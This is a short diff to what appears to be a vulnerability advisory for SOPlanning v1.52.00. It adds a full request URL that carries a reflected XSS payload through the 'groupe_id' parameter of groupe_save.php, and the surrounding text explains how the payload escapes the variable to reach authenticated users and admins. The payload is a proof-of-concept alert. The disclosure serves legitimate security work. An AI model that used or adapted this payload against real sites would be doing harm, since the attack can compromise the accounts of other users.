@@ -71,4 +71,6 @@ Description: SOPlanning v1.52.00 is vulnerable to XSS via the 'groupe_id' parame
 Example Payload:
 "><script>alert('LiQUiDSKY')</script><!--
 
+http://127.0.0.1/soplanning/www/process/groupe_save.php?saved=1&groupe_id="><script>alert('LiQUiDSKY')</script><!--&nom=Project+New
+
 Analysis: The landing page takes into consideration the user input parameter then redirects to a page where the XSS is shown the payload included in the exploit escapes the variable where it is held and comments out the rest to perform a valid reflected XSS attack against any authenticated user including the admin.
